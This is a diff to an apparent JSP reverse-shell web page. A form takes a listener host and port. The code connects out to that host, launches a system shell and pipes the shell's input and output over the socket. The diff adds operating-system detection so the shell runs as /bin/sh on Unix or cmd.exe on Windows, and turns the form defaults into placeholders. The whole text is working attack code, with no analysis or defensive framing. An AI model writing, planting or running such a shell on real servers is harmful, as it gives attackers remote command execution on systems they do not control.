@@ -4,8 +4,8 @@
 <%@page import="java.net.*"%>
 
 <form method="post">
-LHOST: <input type="text" name="ip"   size=12 value="HOSTHOST"><br />
-LPORT: <input type="text" name="port" size=12 value="PORTPORT"><br />
+LHOST: <input type="text" name="ip"   size=12 placeholder="HOSTHOST"><br />
+LPORT: <input type="text" name="port" size=12 placeholder="PORTPORT"><br />
 <input type="submit" name="Connect" value="Connect"><br />
 </form>
 
@@ -52,12 +52,19 @@ try
         }
     }
 
-    try
-    {
-      Socket socket = new Socket( ipAddress,(new Integer(ipPort)).intValue());
-        Process process = Runtime.getRuntime().exec( "cmd.exe" );
+      try
+      {
+        String ShellPath;
+    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+      ShellPath = new String("/bin/sh");
+    } else {
+      ShellPath = new String("cmd.exe");
+    }
+
+        Socket socket = new Socket( ipAddress,(new Integer(ipPort)).intValue());
+        Process process = Runtime.getRuntime().exec( ShellPath );
         ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
         ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
-    } catch( Exception e ) {}
+      } catch( Exception e ) {}
 }
-%> 
+%>
